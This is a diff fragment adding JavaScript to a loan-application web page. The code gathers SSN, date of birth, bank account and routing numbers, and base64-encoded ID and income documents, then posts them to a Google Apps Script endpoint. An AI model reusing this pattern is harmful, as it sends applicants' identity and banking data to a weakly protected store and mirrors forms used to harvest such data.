+      document.getElementById('success-section').style.display = 'none';
+      document.getElementById('application-section').scrollIntoView({ behavior: 'smooth' });
+      
+      setTimeout(() => {
+        document.querySelector('#application-section input').focus();
+      }, 500);
+    }
+
+    // 4. Handle Full Application Submit
+    function getBase64(file) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => resolve(reader.result.split(',')[1]); 
+        reader.onerror = error => reject(error);
+      });
+    }
+
+    document.getElementById('loanForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const submitBtn = document.getElementById('submitBtn');
+      submitBtn.textContent = "Processing... Please wait.";
+      submitBtn.disabled = true;
+
+      try {
+        const formData = new FormData(this);
+        
+        const idFile = document.getElementById('idFile').files[0];
+        const addressFile = document.getElementById('addressFile').files[0];
+        const incomeFiles = document.getElementById('incomeFile').files;
+
+        let idBase64 = idFile ? await getBase64(idFile) : "";
+        let addressBase64 = addressFile ? await getBase64(addressFile) : "";
+        let incomeBase64Array = [];
+        
+        for (let i = 0; i < incomeFiles.length; i++) {
+          let base64 = await getBase64(incomeFiles[i]);
+          incomeBase64Array.push({ name: incomeFiles[i].name, data: base64 });
+        }
+
+        const payload = {
+          fullName: formData.get('fullName'),
+          dob: formData.get('dob'),
+          citizenship: formData.get('citizenship'),
+          ssn: formData.get('ssn'),
+          address: formData.get('address'),
+          phone: formData.get('phone'),
+          email: formData.get('email'),
+          housingStatus: formData.get('housingStatus'),
+          monthlyHousingPayment: formData.get('monthlyHousingPayment'),
+          idFileName: idFile ? idFile.name : "No File",
+          idFileData: idBase64,
+          addressFileName: addressFile ? addressFile.name : "No File",
+          addressFileData: addressBase64,
+          employmentStatus: formData.get('employmentStatus'),
+          employerName: formData.get('employerName'),
+          employerContact: formData.get('employerContact'),
+          employmentHistory: formData.get('employmentHistory'),
+          annualIncome: formData.get('annualIncome'),
+          incomeFiles: incomeBase64Array, 
+          monthlyDebts: formData.get('monthlyDebts'),
+          creditScore: formData.get('creditScore'),
+          loanAmount: formData.get('loanAmount'),
+          repaymentTerm: formData.get('repaymentTerm'),
+          loanPurpose: formData.get('loanPurpose'),
+          bankAccount: formData.get('bankAccount'),
+          bankRouting: formData.get('bankRouting')
+        };
+
+        if (GOOGLE_SCRIPT_URL === "YOUR_GOOGLE_APP_SCRIPT_WEB_APP_URL_HERE") {
+           setTimeout(() => {
+              document.getElementById('application-section').style.display = 'none';
+              document.getElementById('success-section').style.display = 'block';
+              document.getElementById('loanForm').reset();
+              window.scrollTo({ top: 0, behavior: 'smooth' });
+           }, 1500);
+           return;
+        }
+
+        const response = await fetch(GOOGLE_SCRIPT_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: JSON.stringify(payload)
+        });
+
+        const result = await response.json();
+        
+        if (result.status === "success") {
+          document.getElementById('application-section').style.display = 'none';
+          document.getElementById('success-section').style.display = 'block';
+          document.getElementById('loanForm').reset();
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        } else {
+          alert("Error submitting form: " + result.message);
+          submitBtn.textContent = "Submit Full Application";
+          submitBtn.disabled = false;
+        }
+      } catch (error) {
+        console.error("Error!", error.message);
+        alert("There was an error connecting to the server. Please try again.");
+        submitBtn.textContent = "Submit Full Application";
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
